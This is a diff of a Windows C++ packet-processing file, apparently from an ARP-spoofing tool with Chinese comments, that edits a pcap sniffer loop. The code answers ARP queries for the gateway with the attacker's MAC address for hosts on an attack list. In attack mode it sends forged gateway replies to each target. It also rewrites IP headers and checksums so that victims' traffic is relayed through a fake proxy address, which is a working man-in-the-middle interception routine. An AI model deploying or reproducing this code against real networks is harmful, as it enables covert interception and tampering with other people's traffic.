@@ -1,25 +1,24 @@
 ﻿
 
-//#include <WINSOCK2.H>
-
-//#include <winsock.h>
+#define WIN32_LEAN_AND_MEAN  // 减少不必要的头文件
+#include <winsock2.h>
 #include <windows.h>
-#include "..\\include\\pcap.h"
-#include "..\\include\\pcap\\pcap.h"
+
 #include <IPHlpApi.h>
-#pragma comment(lib,"iphlpapi.lib")
-#include "Public.h"
+#include "Utils.h"
 #include "Packet.h"
 #include "PacketProcess.h"
 #include <map>
 #include <unordered_map>  
-#include "PublicUtils.h"
+#include "Public.h"
 #include "ClientAddress.h"
 #include "ArpCheat.h"
 #include "connectionManager.h"
 #include "config.h"
 #include "nat.h"
+#include "ArpCheat.h"
 
+#pragma comment(lib,"iphlpapi.lib")
 
 //1 query reply
 //2 dhcp
@@ -45,12 +44,11 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 	unsigned short *			lpSubCheckSum;
 	unsigned short *			lpDstPort;
 	unsigned short *			lpSrcPort;
-
-	char szShowInfo[1024];
+	int iRet = 0;
 
 	while (TRUE)
 	{
-		int iRet = pcap_next_ex(pcapt,&lpPcapHdr,&lpPacket);
+		iRet = pcap_next_ex(pcapt,&lpPcapHdr,&lpPacket);
 		if (iRet == 0)
 		{
 			continue;
@@ -58,76 +56,82 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 		else if (iRet < 0)
 		{
 			char * lpError = pcap_geterr(pcapt);
-			wsprintfA(szShowInfo,"pcap_next_ex return value is 0 or negtive,error description:%s\r\n",lpError);
-			printf(szShowInfo);
+			printf("%s line:%d error\n", __FUNCTION__, __LINE__);
 			continue;
 		}
 		else if (lpPcapHdr->caplen != lpPcapHdr->len || lpPcapHdr->caplen >= MAX_PACKET_SIZE)
 		{
-			printf("pcap_next_ex caplen error\r\n");
+			printf("%s line:%d error\n", __FUNCTION__, __LINE__);
 			continue;
 		}
 
 		int iCapLen = lpPcapHdr->caplen;
 		LPMACHEADER lpMac = (LPMACHEADER)lpPacket;
 
-		if (lpMac->Protocol == 0x0608) {
+		if (lpMac->Protocol == 0x0608 ) {
 			LPARPHEADER		ARPheader = (LPARPHEADER)((char*)lpMac + sizeof(MACHEADER));
-			if (ARPheader->HardWareType == 0x0100 && ARPheader->ProtocolType == 0x0008 && ARPheader->HardWareSize == MAC_ADDRESS_SIZE &&
-				ARPheader->ProtocolSize == sizeof(unsigned int)  ) {
+			if (ARPheader->HardWareType == 0x0100 && ARPheader->ProtocolType == 0x0008 && 
+				ARPheader->HardWareSize == MAC_ADDRESS_SIZE &&
+				ARPheader->ProtocolSize == sizeof(unsigned long)  ) {
 
 				unsigned int senderip = *(unsigned int *)ARPheader->SenderIP;
 				unsigned int recverip = *(unsigned int *)ARPheader->RecverIP;
 
-				if (ARPheader->Opcode == 0x0100)
-				{
-					//其他主机查询自己的虚拟ip和mac，给查询者返回虚拟网卡地址
+				if (ARPheader->Opcode == 0x0100  )
+				{			
 					if ((memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 || 
 						memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) &&
-						/*(memcmp(ARPheader->RecverMac, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&*/ recverip == gFakeProxyIP )
+						/*(memcmp(ARPheader->RecverMac, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&*/ //recvermac可能为0
+						recverip == gVirtualProxyIP )
 					{
+						//其他主机查询virtual ip的mac地址，返回虚拟网卡地址
 						if (senderip && memcmp(ARPheader->SenderMac,ZERO_MAC_ADDRESS,MAC_ADDRESS_SIZE) != 0 )
 						{
-							iRet = ArpCheat::makeFakeClient(pcapt, senderip, ARPheader->SenderMac);
+							iRet = ArpCheat::VirtualProxy(pcapt, senderip, ARPheader->SenderMac);
 						}
 					}
-					//任何一台主机查询网关，如果再攻击列表中,给被查询者更新本地mac和ip
-					//分两种，广播和非广播，非广播的目的mac是自己
-					else if ((memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0 || 
+					else if ( (memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0 || 
 						memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&
-						(recverip == gGatewayIP) && (memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0))
+						(recverip == gGatewayIP) && 
+						(memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE)== 0))
 					{
+						//任何一台主机查询网关ip的mac地址，如果在攻击列表中,给被查询者更新本地mac和ip
+						//分两种，广播和非广播，非广播的目的mac是自己
 						unsigned char * sendermac = ClientAddress::isTarget(senderip);
-						if (sendermac)
+						if (sendermac && (gMode == ATTACK_MODE))
 						{
-							iRet = ArpCheat::arpReply(pcapt, gGatewayIP, gLocalMAC,senderip, ARPheader->SenderMac);
+							iRet = ArpCheat::EchoRARP(pcapt, gGatewayIP, gLocalMAC,senderip, ARPheader->SenderMac);
 						}
-					}
-					//任何主机查询自己，返回自己的正确网络地址
+					}					
 					else if ((memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0 || 
 						memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&
-						(recverip == gLocalIP) && (memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0))
+						(recverip == gLocalIP) && 
+						(memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0))
 					{
-						iRet = ArpCheat::arpReply(pcapt, gLocalIP, gLocalMAC, senderip, ARPheader->SenderMac);
+						//任何主机查询自己，返回网络地址
+						iRet = ArpCheat::EchoRARP(pcapt, gLocalIP, gLocalMAC, senderip, ARPheader->SenderMac);
 					}
-					//网关查询所有主机的回复
 					else if ( (memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) &&
 						(memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
 						(memcmp(ARPheader->SenderMac, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
-						(senderip == gGatewayIP) && (memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) )
+						(senderip == gGatewayIP) &&
+						(memcmp(ARPheader->RecverMac, ZERO_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) )
 					{
+						//网关查询所有主机,把本机MAC地址和所有被攻击IP绑定
 						if (recverip == gLocalIP)
 						{
-							iRet = ArpCheat::arpReply(pcapt, gLocalIP, gLocalMAC, senderip, ARPheader->SenderMac);
+							iRet = ArpCheat::EchoRARP(pcapt, gLocalIP, gLocalMAC, senderip, ARPheader->SenderMac);
+						}
+						else if (recverip == gVirtualProxyIP) {
+							iRet = ArpCheat::EchoRARP(pcapt, recverip, gLocalMAC, senderip, ARPheader->SenderMac);
 						}
 						else {
 							unsigned char * dstmac = ClientAddress::isTarget(recverip);
 							if (dstmac) {
-								iRet = ArpCheat::arpReply(pcapt, recverip, gLocalMAC, senderip, ARPheader->SenderMac);
+								iRet = ArpCheat::EchoRARP(pcapt, recverip, gLocalMAC, senderip, ARPheader->SenderMac);
 							}
 						}
 					}
-
 					//adjust self
 // 					else if ( (memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0 ||
 // 						memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) &&
@@ -140,12 +144,26 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 				}
 				else if (ARPheader->Opcode == 0x0200)
 				{
-					//网关广播自己得地址，对每个被攻击者发送本地地址
 					if ((memcmp(lpMac->DstMAC, BROADCAST_MAC_ADDRESS, MAC_ADDRESS_SIZE) == 0) &&
 						(memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
 						(gGatewayIP == senderip) &&
 						memcmp(ARPheader->SenderMac, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) {
-							iRet = ArpCheat::sendRarps(pcapt);
+						//网关广播自己得地址，对每个被攻击者发送本地地址
+						if (gMode == ATTACK_MODE) {
+							iRet = ArpCheat::VirtualProxy(pcapt, gGatewayIP, gGatewayMAC);
+							int cnt = gAttackTargetIP.size();
+							for (int i = 0; i < cnt; i++)
+							{
+								if (gAttackTargetIP[i].clientIP == 0 ||
+									memcmp(gAttackTargetIP[i].clientMAC, "\x00\x00\x00\x00\x00\x00", 6) == 0)
+								{
+									continue;
+								}
+								iRet = ArpCheat::FakeGateway(pcapt, gAttackTargetIP[i].clientIP, gAttackTargetIP[i].clientMAC);
+
+								iRet = ArpCheat::VirtualProxy(pcapt, gAttackTargetIP[i].clientIP, gAttackTargetIP[i].clientMAC);
+							}
+						}
 					}
 					else {
 						//iRet = Config::addTarget(gOnlineObjects, recverip, ARPheader->RecverMac);
@@ -166,7 +184,6 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 		}
 
 		int iIpHdrLen = (lpIPHdr->HeaderSize << 2);
-
 		if (lpIPHdr->Protocol == IPPROTO_TCP)
 		{
 			lpTcp = (LPTCPHEADER)((char*)lpIPHdr + iIpHdrLen);
@@ -192,33 +209,33 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 
 		unsigned char * lpCheckSumData = (unsigned char*)((char*)lpIPHdr + iIpHdrLen);
 		unsigned int checkSumLen = iCapLen - (lpCheckSumData - lpPacket);
-		unsigned short subProtocol = lpIPHdr->Protocol;
+		unsigned short protocol = lpIPHdr->Protocol;
 
-
-		//arp attack cause self hijacked
-		if (memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 && memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 &&
+		
+		if (memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 && 
+			memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 &&
 			lpIPHdr->SrcIP == gLocalIP )
 		{
+			//arp attack cause self hijacked
 			memmove(lpMac->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE);
 			iRet = pcap_sendpacket(pcapt, lpPacket, iCapLen);
 			if (iRet)
 			{
-				printf("SnifferHijack pcap_sendpacket error\r\n");
+				printf("%s line:%d error\n", __FUNCTION__, __LINE__);
 			}
  			continue;
 		}
 		else if ( (memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) && 
 			(memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0) &&
-			//here
-			//(lpIPHdr->DstIP == gLocalIP) 
-			(lpIPHdr->DstIP == gFakeProxyIP)
+			//caution here
+			//(lpIPHdr->DstIP == gLocalIP)
+			(lpIPHdr->DstIP == gVirtualProxyIP)
 			)
 		{
 			
-			CLIENTADDRESSES ca = ConnectionManager::get(dstPort,lpIPHdr->SrcIP, srcPort,subProtocol);
+			CLIENTADDRESSES ca = ConnectionManager::get(dstPort,lpIPHdr->SrcIP, srcPort, protocol);
 			if (ca.clientIP == 0 || memcmp(ca.clientMAC,ZERO_MAC_ADDRESS,MAC_ADDRESS_SIZE) == 0)
 			{
-				//printf("not found CLIENTADDRESSES info\r\n");
 				continue;
 			}
 
@@ -226,7 +243,6 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 			memmove(lpMac->DstMAC, ca.clientMAC, MAC_ADDRESS_SIZE);
 			lpIPHdr->DstIP = ca.clientIP;
 			
-
 			//modify here
 // 			unsigned char dstmac[MAC_ADDRESS_SIZE];
 // 			unsigned long dstip = 0;
@@ -241,7 +257,8 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 			lpIPHdr->HeaderChksum = checksum((unsigned short*)lpIPHdr, iIpHdrLen);
 
 			*lpSubCheckSum = 0;
-			*lpSubCheckSum = subPackChecksum((char*)lpCheckSumData, checkSumLen, lpIPHdr->SrcIP, lpIPHdr->DstIP, subProtocol);
+			*lpSubCheckSum = subPackChecksum((char*)lpCheckSumData, checkSumLen, lpIPHdr->SrcIP, 
+				lpIPHdr->DstIP, protocol);
 
 			iRet = pcap_sendpacket(pcapt, lpPacket, iCapLen);
 			if (iRet)
@@ -251,8 +268,10 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 			continue;
 		}
 		else if ((memcmp(lpMac->DstMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0) && 
-			((memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) != 0) && (memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) != 0)) &&
-			( ( (lpIPHdr->SrcIP & gNetMask) == gNetMaskIP) && (lpIPHdr->SrcIP != gLocalIP) && (lpIPHdr->SrcIP != gGatewayIP)  ) )
+			((memcmp(lpMac->SrcMAC, gGatewayMAC, MAC_ADDRESS_SIZE) != 0) && 
+				(memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) != 0)) &&
+			( ( (lpIPHdr->SrcIP & gNetMask) == gNetMaskIP) && (lpIPHdr->SrcIP != gLocalIP) && 
+				(lpIPHdr->SrcIP != gGatewayIP)  ) )
 		{
 			
 			CLIENTADDRESSES ca = { 0 };
@@ -260,10 +279,8 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 			memmove(ca.clientMAC, lpMac->SrcMAC, MAC_ADDRESS_SIZE);
 			ca.time = time(0);
 			ca.clientPort = srcPort;
-			iRet = ConnectionManager::put(lpIPHdr->SrcIP, srcPort, lpIPHdr->DstIP, dstPort,subProtocol, ca);
+			iRet = ConnectionManager::put(lpIPHdr->SrcIP, srcPort, lpIPHdr->DstIP, dstPort, protocol, ca);
 			
-
-
 			//modify here
 // 			unsigned char srcmac[MAC_ADDRESS_SIZE];
 // 			memcpy(srcmac, lpMac->SrcMAC, MAC_ADDRESS_SIZE);
@@ -277,13 +294,14 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 
 			//here
 			//lpIPHdr->SrcIP = gLocalIP;
-			lpIPHdr->SrcIP = gFakeProxyIP;
+			lpIPHdr->SrcIP = gVirtualProxyIP;
 
 			lpIPHdr->HeaderChksum = 0;
 			lpIPHdr->HeaderChksum = checksum((unsigned short*)lpIPHdr, iIpHdrLen);
 
 			*lpSubCheckSum = 0;
-			*lpSubCheckSum = subPackChecksum((char*)lpCheckSumData, checkSumLen, lpIPHdr->SrcIP, lpIPHdr->DstIP, subProtocol);
+			*lpSubCheckSum = subPackChecksum((char*)lpCheckSumData, checkSumLen, lpIPHdr->SrcIP, 
+				lpIPHdr->DstIP, protocol);
 
 			iRet = pcap_sendpacket(pcapt, lpPacket, iCapLen);
 			if (iRet)
@@ -293,7 +311,8 @@ int __stdcall PacketProcess::Sniffer(pcap_t * pcapt)
 			
 			continue;
 		}
-// 		else if (memcmp(lpMac->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0 && memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 &&
+// 		else if (memcmp(lpMac->DstMAC, gGatewayMAC, MAC_ADDRESS_SIZE) == 0 && 
+//			memcmp(lpMac->SrcMAC, gLocalMAC, MAC_ADDRESS_SIZE) == 0 &&
 // 			lpIPHdr->SrcIP == gLocalIP)
 // 		{
 // 			continue;
@@ -332,7 +351,8 @@ WORD PacketProcess::checksum(WORD *buffer, int size)
 
 
 
-USHORT PacketProcess::subPackChecksum(char * lpCheckSumData, WORD wCheckSumSize, DWORD dwSrcIP, DWORD dwDstIP, unsigned short wProtocol)
+USHORT PacketProcess::subPackChecksum(char * lpCheckSumData, WORD wCheckSumSize, 
+	DWORD dwSrcIP, DWORD dwDstIP, unsigned short wProtocol)
 {
 	char szCheckSumBuf[4096];
 	LPCHECKSUMFAKEHEADER lpFakeHdr = (LPCHECKSUMFAKEHEADER)szCheckSumBuf;
@@ -348,11 +368,6 @@ USHORT PacketProcess::subPackChecksum(char * lpCheckSumData, WORD wCheckSumSize,
 	unsigned short nCheckSum = checksum((WORD*)szCheckSumBuf, wCheckSumSize + sizeof(CHECKSUMFAKEHEADER));
 	return nCheckSum;
 }
-
-
-
-
-
 
 
 
